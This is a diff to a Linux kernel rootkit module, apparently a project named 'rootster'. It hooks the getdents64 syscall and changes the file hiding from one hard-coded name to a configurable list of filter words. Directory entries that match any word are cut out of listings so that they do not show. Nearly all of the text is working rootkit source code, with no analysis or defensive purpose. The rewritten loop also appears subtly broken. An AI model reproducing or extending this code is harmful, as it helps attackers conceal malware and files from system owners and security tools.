@@ -1,5 +1,5 @@
 #include "getdents64.h"
-#include "../constants.h"
+#include "../shared.h"
 #include "linux/kern_levels.h"
 #include "linux/slab.h"
 #include "linux/uaccess.h"
@@ -14,8 +14,6 @@
 #include <linux/syscalls.h>
 #include <linux/unistd.h>
 #include <linux/version.h>
-
-#define HIDDEN_NAME "rootster"
 
 asmlinkage long (*real_sys_getdents64)(struct pt_regs *regs);
 asmlinkage long getdents64_hook(struct pt_regs *regs) {
@@ -34,40 +32,47 @@ asmlinkage long getdents64_hook(struct pt_regs *regs) {
     return ret;
   }
 
+  struct filter_word *element;
+
   while (offset < ret) {
+    list_for_each_entry(element, &filter_words, list) {
+      current_dirent = (void *)kspace_dirent + offset;
 
-    current_dirent = (void *)kspace_dirent + offset;
+      unsigned long prefix_len = strlen(element->name);
+      unsigned long name_len = strlen(current_dirent->d_name);
 
-    unsigned long prefix_len = strlen(HIDDEN_NAME);
-    unsigned long name_len = strlen(current_dirent->d_name);
-
-    if (name_len < prefix_len) {
-      previous_dir = current_dirent;
-      offset += current_dirent->d_reclen;
-      continue;
-    }
-    if (memcmp(HIDDEN_NAME, current_dirent->d_name, strlen(HIDDEN_NAME)) == 0 ||
-        (strstr(kspace_dirent->d_name, HIDDEN_NAME) != NULL)) {
-
-      ret -= (unsigned long)current_dirent->d_reclen;
-
-      if (current_dirent == kspace_dirent) {
-        printk(KERN_INFO
-               "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
-               &current_dirent, current_dirent->d_name, current_dirent->d_type);
-        memmove(current_dirent,
-                (void *)current_dirent + current_dirent->d_reclen,
-                ret + offset);
+      if (name_len < prefix_len) {
+        previous_dir = current_dirent;
+        offset += current_dirent->d_reclen;
         continue;
       }
 
-      previous_dir->d_reclen += current_dirent->d_reclen;
-      printk(KERN_INFO
-             "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
-             &current_dirent, current_dirent->d_name, current_dirent->d_type);
-    } else {
+      if (memcmp(&element->name, current_dirent->d_name,
+                 strlen(element->name)) == 0 ||
+          (strstr(kspace_dirent->d_name, element->name) != NULL)) {
 
-      previous_dir = current_dirent;
+        ret -= (unsigned long)current_dirent->d_reclen;
+
+        if (current_dirent == kspace_dirent) {
+          printk(KERN_INFO
+                 "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
+                 &current_dirent, current_dirent->d_name,
+                 current_dirent->d_type);
+          memmove(current_dirent,
+                  (void *)current_dirent + current_dirent->d_reclen,
+                  ret + offset);
+          continue;
+        }
+
+        previous_dir->d_reclen += current_dirent->d_reclen;
+        printk(KERN_INFO
+               "hooked_getdents64: dirent=%p, Dir name: %s, Dir type: %u",
+               &current_dirent, current_dirent->d_name, current_dirent->d_type);
+      } else {
+        printk(KERN_ERR "No dir found");
+
+        previous_dir = current_dirent;
+      }
     }
 
     offset += current_dirent->d_reclen;
